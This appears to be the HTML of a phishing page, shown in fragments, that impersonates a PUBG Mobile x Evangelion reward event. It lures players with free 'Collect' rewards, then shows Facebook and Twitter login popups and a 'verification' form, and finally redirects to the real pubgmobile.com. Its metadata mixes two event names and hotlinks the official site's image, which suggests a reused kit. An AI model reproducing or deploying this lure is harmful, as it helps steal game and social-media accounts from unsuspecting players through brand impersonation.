...
<meta property="og:title" content="PUBG MOBILE X EVANGELION">
<meta name="description" content="Collect your special rewards at the Evangelion event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Silvanus X-Suit event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE X EVANGELION">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/images/event/silvanusx_suit/share/en.png">
<title>PUBG MOBILE EVANGELION</title>
...
<div class="event-theme-wrapper">
<img src="img/event-theme-title.png">
<div class="event-theme-subtitle"><span></span></div>
</div> <!--- event-theme-icon --->
<div class="box">
<div class="menu-wrapper-border"></div> <!--- menu-wrapper-border --->
<div class="menu-wrapper">
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'season');" id="defaultTabRewards">Event Reward</div> <!--- menu-content --->
</div> <!--- menu-wrapper --->
<center>
...
<div>
<button type="button" onmousedown="buka.play();" onclick="open_otherReward_confirmation(this);" value="" src="img/rewards/6.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
...
<img class="footer-socmed-img-main" src="img/footer-socmed-1.png">
<p>Facebook</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-other" src="img/footer-socmed-2.png">
<p>Twitter</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Subscribe</button>
<img class="footer-socmed-img-other" src="img/footer-socmed-3.png">
<p>Youtube</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Follow</button>
<img class="footer-socmed-img-main" src="img/footer-socmed-4.png">
<p>Instagram</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Like</button>
<img class="footer-socmed-img-main" src="img/footer-socmed-5.png">
<p>VK</p>
</div> <!--- footer-socmed-box --->
<div class="footer-socmed-box">
<button type="button">Join</button>
<img class="footer-socmed-img-other" src="img/footer-socmed-6.png">
<p>Discord</p>
</div> <!--- footer-socmed-box --->
<img class="footer-copyright-icon" src="img/footer-img.png">
...
<div class="popup-box-wrapper-bg">
...
<br>
</div> <!--- popup-box-wrapper-bg --->
<div class="popup-box-footer" style="height: 50px;"></div> <!--- popup-box-footer --->
...
<div class="navbar-fb"><img src="img/login-Method1.png"></div> <!--- navbar-fb --->
...
<div class="header-twitter"><img src="img/login-Method2.png"></div> <!--- header-twitter --->
<br>
<br>
<br>
<center>
...
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Confirmation</button>
</div> <!--- popup-footer --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup --->
...
<div class="popup-box-footer">
<button type="button" onmousedown="buka.play();" onclick="location.href='https://pubgmobile.com/';">Logout</button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup --->
